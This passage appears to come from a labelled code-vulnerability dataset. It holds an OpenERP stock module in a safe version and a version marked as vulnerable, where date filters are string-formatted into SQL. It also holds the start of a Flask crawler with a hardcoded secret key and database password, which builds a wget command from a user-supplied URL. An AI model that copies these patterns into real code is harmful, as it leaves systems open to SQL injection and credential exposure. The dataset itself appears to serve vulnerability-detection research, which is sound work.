                diff = product.standard_price - new_price
                if not diff: raise osv.except_osv(_('Error!'), _(""Could not find any difference between standard price and new price!""))
                if qty:
                    company_id = location.company_id and location.company_id.id or False
                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))
                    #
                    # Accounting Entries
                    #
                    if not journal_id:
                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False
                    if not journal_id:
                        raise osv.except_osv(_('Error!'),
                            _('There is no journal defined '\
                                'on the product category: ""%s"" (id: %d)') % \
                                (product.categ_id.name,
                                    product.categ_id.id,))
                    move_id = move_obj.create(cr, uid, {
                                'journal_id': journal_id,
                                'company_id': company_id
                                })

                    move_ids.append(move_id)


                    if diff > 0:
                        if not stock_input_acc:
                            stock_input_acc = product.product_tmpl_id.\
                                property_stock_account_input.id
                        if not stock_input_acc:
                            stock_input_acc = product.categ_id.\
                                    property_stock_account_input_categ.id
                        if not stock_input_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock input account defined ' \
                                            'for this product: ""%s"" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * diff
                        move_line_obj.create(cr, uid, {
                                    'name': product.name,
                                    'account_id': stock_input_acc,
                                    'debit': amount_diff,
                                    'move_id': move_id,
                                    })
                        move_line_obj.create(cr, uid, {
                                    'name': product.categ_id.name,
                                    'account_id': account_variation_id,
                                    'credit': amount_diff,
                                    'move_id': move_id
                                    })
                    elif diff < 0:
                        if not stock_output_acc:
                            stock_output_acc = product.product_tmpl_id.\
                                property_stock_account_output.id
                        if not stock_output_acc:
                            stock_output_acc = product.categ_id.\
                                    property_stock_account_output_categ.id
                        if not stock_output_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock output account defined ' \
                                            'for this product: ""%s"" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * -diff
                        move_line_obj.create(cr, uid, {
                                        'name': product.name,
                                        'account_id': stock_output_acc,
                                        'credit': amount_diff,
                                        'move_id': move_id
                                    })
                        move_line_obj.create(cr, uid, {
                                        'name': product.categ_id.name,
                                        'account_id': account_variation_id,
                                        'debit': amount_diff,
                                        'move_id': move_id
                                    })

            self.write(cr, uid, rec_id, {'standard_price': new_price})

        return move_ids

    def view_header_get(self, cr, user, view_id, view_type, context=None):
        if context is None:
            context = {}
        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)
        if res: return res
        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):
            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name
        return res

    def get_product_available(self, cr, uid, ids, context=None):
        """""" Finds whether product is available or not in particular warehouse.
        @return: Dictionary of values
        """"""
        if context is None:
            context = {}
        states = context.get('states',[])
        what = context.get('what',())
        if not ids:
            ids = self.search(cr, uid, [])
        res = {}.fromkeys(ids, 0.0)
        if not ids:
            return res

        if context.get('shop', False):
            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))
            res2 = cr.fetchone()
            if res2:
                context['warehouse'] = res2[0]

        if context.get('warehouse', False):
            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))
            res2 = cr.fetchone()
            if res2:
                context['location'] = res2[0]

        if context.get('location', False):
            if type(context['location']) == type(1):
                location_ids = [context['location']]
            elif type(context['location']) in (type(''), type(u'')):
                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)
            else:
                location_ids = context['location']
        else:
            location_ids = []
            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)
            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):
                location_ids.append(w.lot_stock_id.id)

        # build the list of ids of children of the location given by id
        if context.get('compute_child',True):
            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])
            location_ids = child_location_ids or location_ids
        else:
            location_ids = location_ids

        uoms_o = {}
        product2uom = {}
        for product in self.browse(cr, uid, ids, context=context):
            product2uom[product.id] = product.uom_id.id
            uoms_o[product.uom_id.id] = product.uom_id

        results = []
        results2 = []

        from_date = context.get('from_date',False)
        to_date = context.get('to_date',False)
        date_str = False
        date_values = False
        if from_date and to_date:
            date_str = ""date_planned>=%s and date_planned<=%s""
            date_values = [from_date, to_date]
        elif from_date:
            date_str = ""date_planned>=%s""
            date_values = [from_date] 
        elif to_date:
            date_str = ""date_planned<=%s""
            date_values = [to_date]

        where = [tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states)]
        if date_values:
            where.append(tuple(date_values))
        if 'in' in what:
            # all moves from a location out of the set to a location in the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id NOT IN %s'\
                'and location_dest_id IN %s'\
                'and product_id IN %s'\
                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\
                'group by product_id,product_uom',tuple(where))
            results = cr.fetchall()
        if 'out' in what:
            # all moves from a location in the set to a location out of the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id IN %s'\
                'and location_dest_id NOT IN %s '\
                'and product_id  IN %s'\
                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\
                'group by product_id,product_uom',tuple(where))
            results2 = cr.fetchall()
        uom_obj = self.pool.get('product.uom')
        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)
        if context.get('uom', False):
            uoms += [context['uom']]

        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)
        if uoms:
            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)
        for o in uoms:
            uoms_o[o.id] = o
        for amount, prod_id, prod_uom in results:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] += amount
        for amount, prod_id, prod_uom in results2:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] -= amount
        return res

    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):
        """""" Finds the incoming and outgoing quantity of product.
        @return: Dictionary of values
        """"""
        if not field_names:
            field_names = []
        if context is None:
            context = {}
        res = {}
        for id in ids:
            res[id] = {}.fromkeys(field_names, 0.0)
        for f in field_names:
            c = context.copy()
            if f == 'qty_available':
                c.update({ 'states': ('done',), 'what': ('in', 'out') })
            if f == 'virtual_available':
                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })
            if f == 'incoming_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })
            if f == 'outgoing_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })
            stock = self.get_product_available(cr, uid, ids, context=c)
            for id in ids:
                res[id][f] = stock.get(id, 0.0)
        return res

    _columns = {
        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help=""Current quantities of products in selected locations or all internal if none have been selected."", multi='qty_available'),
        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help=""Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming."", multi='qty_available'),
        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help=""Quantities of products that are planned to arrive in selected locations or all internal if none have been selected."", multi='qty_available'),
        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help=""Quantities of products that are planned to leave in selected locations or all internal if none have been selected."", multi='qty_available'),
        'track_production': fields.boolean('Track Manufacturing Lots' , help=""Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order""),
        'track_incoming': fields.boolean('Track Incoming Lots', help=""Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location""),
        'track_outgoing': fields.boolean('Track Outgoing Lots', help=""Forces to specify a Production Lot for all moves containing this product and going to a Customer Location""),
        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),
        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),
                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', 
                                        help=""If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves."" \
                                             ""The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products.""
                                        , required=True),
    }

    _defaults = {
        'valuation': lambda *a: 'manual_periodic',
    }

    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):
        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)
        if context is None:
            context = {}
        if ('location' in context) and context['location']:
            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])
            fields=res.get('fields',{})
            if fields:
                if location_info.usage == 'supplier':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Receptions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Received Qty')

                if location_info.usage == 'internal':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Stock')

                if location_info.usage == 'customer':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Deliveries')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Delivered Qty')

                if location_info.usage == 'inventory':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future P&L')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('P&L Qty')

                if location_info.usage == 'procurement':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Qty')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Unplanned Qty')

                if location_info.usage == 'production':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Productions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Produced Qty')
        return res

product_product()

class product_template(osv.osv):
    _name = 'product.template'
    _inherit = 'product.template'
    _columns = {
        'property_stock_procurement': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string=""Procurement Location"",
            method=True,
            view_load=True,
            domain=[('usage','like','procurement')],
            help=""For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements""),
        'property_stock_production': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string=""Production Location"",
            method=True,
            view_load=True,
            domain=[('usage','like','production')],
            help=""For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders""),
        'property_stock_inventory': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string=""Inventory Location"",
            method=True,
            view_load=True,
            domain=[('usage','like','inventory')],
            help=""For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory""),
        'property_stock_account_input': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
        'property_stock_account_output': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
    }

product_template()

class product_category(osv.osv):

    _inherit = 'product.category'
    _columns = {
        'property_stock_journal': fields.property('account.journal',
            relation='account.journal', type='many2one',
            string='Stock journal', method=True, view_load=True,
            help=""When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.""),
        'property_stock_account_input_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_account_output_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_variation': fields.property('account.account',
            type='many2one',
            relation='account.account',
            string=""Stock Variation Account"",
            method=True, view_load=True,
            help=""When real-time inventory valuation is enabled on a product, this account will hold the current value of the products."",),
    }

product_category()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/n",0
45,45,1521b235409982842b63b423c6ff7ac4ed4ca1db,"/addons/stock/product.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import fields, osv
from tools.translate import _

class product_product(osv.osv):
    _inherit = ""product.product""

    def get_product_accounts(self, cr, uid, product_id, context=None):
        """""" To get the stock input account, stock output account and stock journal related to product.
        @param product_id: product id
        @return: dictionary which contains information regarding stock input account, stock output account and stock journal
        """"""
        if context is None:
            context = {}
        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)

        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False
        if not stock_input_acc:
            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False

        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False
        if not stock_output_acc:
            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False

        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False
        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False

        return {
            'stock_account_input': stock_input_acc,
            'stock_account_output': stock_output_acc,
            'stock_journal': journal_id,
            'property_stock_variation': account_variation
        }

    def do_change_standard_price(self, cr, uid, ids, datas, context={}):
        """""" Changes the Standard Price of Product and creates an account move accordingly.
        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal
        @param context: A standard dictionary
        @return:

        """"""
        location_obj = self.pool.get('stock.location')
        move_obj = self.pool.get('account.move')
        move_line_obj = self.pool.get('account.move.line')

        new_price = datas.get('new_price', 0.0)
        stock_output_acc = datas.get('stock_output_account', False)
        stock_input_acc = datas.get('stock_input_account', False)
        journal_id = datas.get('stock_journal', False)
        product_obj=self.browse(cr,uid,ids)[0]
        account_variation = product_obj.categ_id.property_stock_variation
        account_variation_id = account_variation and account_variation.id or False
        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))
        move_ids = []
        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])
        for rec_id in ids:
            for location in location_obj.browse(cr, uid, loc_ids):
                c = context.copy()
                c.update({
                    'location': location.id,
                    'compute_child': False
                })

                product = self.browse(cr, uid, rec_id, context=c)
                qty = product.qty_available
                diff = product.standard_price - new_price
                if not diff: raise osv.except_osv(_('Error!'), _(""Could not find any difference between standard price and new price!""))
                if qty:
                    company_id = location.company_id and location.company_id.id or False
                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))
                    #
                    # Accounting Entries
                    #
                    if not journal_id:
                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False
                    if not journal_id:
                        raise osv.except_osv(_('Error!'),
                            _('There is no journal defined '\
                                'on the product category: ""%s"" (id: %d)') % \
                                (product.categ_id.name,
                                    product.categ_id.id,))
                    move_id = move_obj.create(cr, uid, {
                                'journal_id': journal_id,
                                'company_id': company_id
                                })

                    move_ids.append(move_id)


                    if diff > 0:
                        if not stock_input_acc:
                            stock_input_acc = product.product_tmpl_id.\
                                property_stock_account_input.id
                        if not stock_input_acc:
                            stock_input_acc = product.categ_id.\
                                    property_stock_account_input_categ.id
                        if not stock_input_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock input account defined ' \
                                            'for this product: ""%s"" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * diff
                        move_line_obj.create(cr, uid, {
                                    'name': product.name,
                                    'account_id': stock_input_acc,
                                    'debit': amount_diff,
                                    'move_id': move_id,
                                    })
                        move_line_obj.create(cr, uid, {
                                    'name': product.categ_id.name,
                                    'account_id': account_variation_id,
                                    'credit': amount_diff,
                                    'move_id': move_id
                                    })
                    elif diff < 0:
                        if not stock_output_acc:
                            stock_output_acc = product.product_tmpl_id.\
                                property_stock_account_output.id
                        if not stock_output_acc:
                            stock_output_acc = product.categ_id.\
                                    property_stock_account_output_categ.id
                        if not stock_output_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock output account defined ' \
                                            'for this product: ""%s"" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * -diff
                        move_line_obj.create(cr, uid, {
                                        'name': product.name,
                                        'account_id': stock_output_acc,
                                        'credit': amount_diff,
                                        'move_id': move_id
                                    })
                        move_line_obj.create(cr, uid, {
                                        'name': product.categ_id.name,
                                        'account_id': account_variation_id,
                                        'debit': amount_diff,
                                        'move_id': move_id
                                    })

            self.write(cr, uid, rec_id, {'standard_price': new_price})

        return move_ids

    def view_header_get(self, cr, user, view_id, view_type, context=None):
        if context is None:
            context = {}
        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)
        if res: return res
        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):
            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name
        return res

    def get_product_available(self, cr, uid, ids, context=None):
        """""" Finds whether product is available or not in particular warehouse.
        @return: Dictionary of values
        """"""
        if context is None:
            context = {}
        states = context.get('states',[])
        what = context.get('what',())
        if not ids:
            ids = self.search(cr, uid, [])
        res = {}.fromkeys(ids, 0.0)
        if not ids:
            return res

        if context.get('shop', False):
            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))
            res2 = cr.fetchone()
            if res2:
                context['warehouse'] = res2[0]

        if context.get('warehouse', False):
            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))
            res2 = cr.fetchone()
            if res2:
                context['location'] = res2[0]

        if context.get('location', False):
            if type(context['location']) == type(1):
                location_ids = [context['location']]
            elif type(context['location']) in (type(''), type(u'')):
                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)
            else:
                location_ids = context['location']
        else:
            location_ids = []
            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)
            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):
                location_ids.append(w.lot_stock_id.id)

        # build the list of ids of children of the location given by id
        if context.get('compute_child',True):
            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])
            location_ids = child_location_ids or location_ids
        else:
            location_ids = location_ids

        uoms_o = {}
        product2uom = {}
        for product in self.browse(cr, uid, ids, context=context):
            product2uom[product.id] = product.uom_id.id
            uoms_o[product.uom_id.id] = product.uom_id

        results = []
        results2 = []

        from_date=context.get('from_date',False)
        to_date=context.get('to_date',False)
        date_str=False
        if from_date and to_date:
            date_str=""date_planned>='%s' and date_planned<='%s'""%(from_date,to_date)
        elif from_date:
            date_str=""date_planned>='%s'""%(from_date)
        elif to_date:
            date_str=""date_planned<='%s'""%(to_date)

        if 'in' in what:
            # all moves from a location out of the set to a location in the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id NOT IN %s'\
                'and location_dest_id IN %s'\
                'and product_id IN %s'\
                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)
            )
            results = cr.fetchall()
        if 'out' in what:
            # all moves from a location in the set to a location out of the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id IN %s'\
                'and location_dest_id NOT IN %s '\
                'and product_id  IN %s'\
                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)
            )
            results2 = cr.fetchall()
        uom_obj = self.pool.get('product.uom')
        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)
        if context.get('uom', False):
            uoms += [context['uom']]

        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)
        if uoms:
            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)
        for o in uoms:
            uoms_o[o.id] = o
        for amount, prod_id, prod_uom in results:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] += amount
        for amount, prod_id, prod_uom in results2:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] -= amount
        return res

    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):
        """""" Finds the incoming and outgoing quantity of product.
        @return: Dictionary of values
        """"""
        if not field_names:
            field_names = []
        if context is None:
            context = {}
        res = {}
        for id in ids:
            res[id] = {}.fromkeys(field_names, 0.0)
        for f in field_names:
            c = context.copy()
            if f == 'qty_available':
                c.update({ 'states': ('done',), 'what': ('in', 'out') })
            if f == 'virtual_available':
                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })
            if f == 'incoming_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })
            if f == 'outgoing_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })
            stock = self.get_product_available(cr, uid, ids, context=c)
            for id in ids:
                res[id][f] = stock.get(id, 0.0)
        return res

    _columns = {
        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help=""Current quantities of products in selected locations or all internal if none have been selected."", multi='qty_available'),
        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help=""Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming."", multi='qty_available'),
        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help=""Quantities of products that are planned to arrive in selected locations or all internal if none have been selected."", multi='qty_available'),
        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help=""Quantities of products that are planned to leave in selected locations or all internal if none have been selected."", multi='qty_available'),
        'track_production': fields.boolean('Track Manufacturing Lots' , help=""Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order""),
        'track_incoming': fields.boolean('Track Incoming Lots', help=""Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location""),
        'track_outgoing': fields.boolean('Track Outgoing Lots', help=""Forces to specify a Production Lot for all moves containing this product and going to a Customer Location""),
        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),
        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),
                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', 
                                        help=""If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves."" \
                                             ""The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products.""
                                        , required=True),
    }

    _defaults = {
        'valuation': lambda *a: 'manual_periodic',
    }

    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):
        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)
        if context is None:
            context = {}
        if ('location' in context) and context['location']:
            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])
            fields=res.get('fields',{})
            if fields:
                if location_info.usage == 'supplier':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Receptions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Received Qty')

                if location_info.usage == 'internal':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Stock')

                if location_info.usage == 'customer':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Deliveries')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Delivered Qty')

                if location_info.usage == 'inventory':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future P&L')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('P&L Qty')

                if location_info.usage == 'procurement':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Qty')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Unplanned Qty')

                if location_info.usage == 'production':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Productions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Produced Qty')
        return res

product_product()

class product_template(osv.osv):
    _name = 'product.template'
    _inherit = 'product.template'
    _columns = {
        'property_stock_procurement': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string=""Procurement Location"",
            method=True,
            view_load=True,
            domain=[('usage','like','procurement')],
            help=""For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements""),
        'property_stock_production': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string=""Production Location"",
            method=True,
            view_load=True,
            domain=[('usage','like','production')],
            help=""For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders""),
        'property_stock_inventory': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string=""Inventory Location"",
            method=True,
            view_load=True,
            domain=[('usage','like','inventory')],
            help=""For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory""),
        'property_stock_account_input': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
        'property_stock_account_output': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
    }

product_template()

class product_category(osv.osv):

    _inherit = 'product.category'
    _columns = {
        'property_stock_journal': fields.property('account.journal',
            relation='account.journal', type='many2one',
            string='Stock journal', method=True, view_load=True,
            help=""When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.""),
        'property_stock_account_input_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_account_output_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_variation': fields.property('account.account',
            type='many2one',
            relation='account.account',
            string=""Stock Variation Account"",
            method=True, view_load=True,
            help=""When real-time inventory valuation is enabled on a product, this account will hold the current value of the products."",),
    }

product_category()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:/n/n/n",1
90,90,4bad3673debf0b9491b520f0e22e9186af78c375,"bar.py/n/nimport subprocess
import shlex
import os
import signal
from helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime
import json
from functools import wraps
from urllib.parse import urlparse

from flask import Flask, render_template, flash, redirect, url_for, session, request, logging
from flask_mysqldb import MySQL
from wtforms import Form, StringField, TextAreaField, PasswordField, validators
from passlib.hash import sha256_crypt
import time

app = Flask(__name__)
app.secret_key = 'Aj""$7PE#>3AC6W]`STXYLz*[G\gQWA'


# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'mountain'
app.config['MYSQL_DB'] = 'bar'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'

# init MySQL
mysql = MySQL(app)

# CONSTANTS
WGET_DATA_PATH = 'data'
PDF_TO_PROCESS = 10
MAX_CRAWLING_DURATION = 60 # 15 minutes
WAIT_AFTER_CRAWLING = 1000


# Helper Function

# Check if user logged in
def is_logged_in(f):
    @wraps(f)
    def wrap(*args, **kwargs):
        if 'logged_in' in session:
            return f(*args, **kwargs)
        else:
            flash('Unauthorized, Please login', 'danger')
            return redirect(url_for('login'))
    return wrap


# Index
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute

        # User can type in url
        # The url will then get parsed to extract domain, while the crawler starts at url.

        # Get Form Fields and save
        url = request.form['url']
        parsed = urlparse(url)

        session['domain'] = parsed.netloc
        session['url'] = url

        # TODO use WTForms to get validation

        return redirect(url_for('crawling'))

    return render_template('home.html')


# Crawling
@app.route('/crawling')
@is_logged_in
def crawling():
    # STEP 0: TimeKeeping
    session['crawl_start_time'] = time.time()

    # STEP 1: Prepare WGET command
    url = session.get('url', None)

    command = shlex.split(""timeout %d wget -r -A pdf %s"" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove
    #command = shlex.split(""wget -r -A pdf %s"" % (url,))

    #TODO use celery
    #TODO give feedback how wget is doing

